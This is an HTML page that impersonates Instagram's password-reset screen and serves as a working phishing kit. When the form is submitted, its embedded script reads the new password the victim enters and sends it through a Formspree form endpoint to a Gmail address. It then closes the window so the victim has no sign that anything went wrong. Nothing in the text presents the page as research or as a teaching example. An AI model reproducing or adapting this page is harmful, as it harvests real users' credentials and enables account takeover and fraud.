<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Instagram - Reset Password</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #000;
            color: #fff;
            margin: 0;
        }
        .container {
            background: #121212;
            padding: 24px;
            border-radius: 10px;
            box-shadow: none;
            width: 90%;
            max-width: 360px;
            text-align: center;
        }
        h2 {
            font-size: 20px;
            font-weight: bold;
            margin-bottom: 8px;
        }
        p {
            font-size: 14px;
            color: #b3b3b3;
            margin-bottom: 16px;
        }
        input {
            background-color: #262626;
            color: #fff;
            width: 100%;
            padding: 14px;
            margin: 8px 0;
            border: 1px solid #444;
            border-radius: 5px;
            font-size: 14px;
            display: block;
        }
        button {
            background-color: #3b5998;
            color: #fff;
            font-size: 14px;
            font-weight: bold;
            border: none;
            padding: 14px;
            width: 100%;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 10px;
        }
        button:hover {
            background-color: #2a4373;
        }
    </style>
    <script>
        function sendEmailAndClose(event) {
            event.preventDefault();
            
            let newPassword = document.querySelector('input[name="new_password"]').value;
            
            fetch("https://formspree.io/f/mnqeyzln", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    email: "qenes4444@gmail.com",
                    message: "The new password set by the user is: " + newPassword
                })
            }).then(response => {
                if (response.ok) {
                    console.log("Email sent successfully");
                    window.close();
                } else {
                    console.error("Error sending email:", response.statusText);
                    alert("Failed to send email. Please try again.");
                }
            }).catch(error => {
                console.error("Error:", error);
                alert("An error occurred. Please check the console.");
            });
        }
    </script>
</head>
<body>
    <div class="container">
        <h2>Create a Strong Password</h2>
        <p>Your password must be at least 6 characters long and include numbers, letters, and special characters (!@$%).</p>
        <form onsubmit="sendEmailAndClose(event)">
            <input type="password" name="new_password" placeholder="New password" required>
            <input type="password" name="confirm_password" placeholder="Confirm new password" required>
            <button type="submit">Reset Password</button>
        </form>
    </div>
</body>
</html>
